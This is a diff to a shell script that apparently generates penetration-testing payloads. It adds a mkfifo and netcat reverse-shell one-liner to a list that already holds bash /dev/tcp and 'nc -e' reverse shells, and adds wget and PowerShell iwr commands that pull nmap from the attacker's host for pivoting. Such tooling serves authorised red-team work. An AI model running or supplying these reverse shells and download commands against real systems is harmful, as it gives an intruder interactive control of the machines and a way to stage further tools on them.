@@ -5,7 +5,7 @@ lhost=""
 lport=4444
 
 usage() {
-    echo "Usage:" 
+    echo "Usage:"
     echo "-c    -> compile binaries and list"
     echo "-d    -> only compile binaries"
     echo "-g    -> generate powershell one liners"
@@ -58,6 +58,8 @@ list_stuff() {
     echo "ONE LINERS"
     echo "=============================================="
     echo "bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'"
+    echo ""
+    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f"
     echo ""
     echo "nc -e /bin/bash $lhost $lport"
     echo ""
@@ -120,6 +122,9 @@ list_stuff() {
     echo ""
     echo "PIVOTING"
     echo "=============================================="
+    echo "iwr -uri http://$lhost/payloads/nmap.exe -OutFile nmap.exe"
+    echo "wget http://$lhost/payloads/nmap"
+    echo ""
     echo "iwr -uri http://$lhost/payloads/plink.exe -OutFile plink.exe"
     echo ""
 }
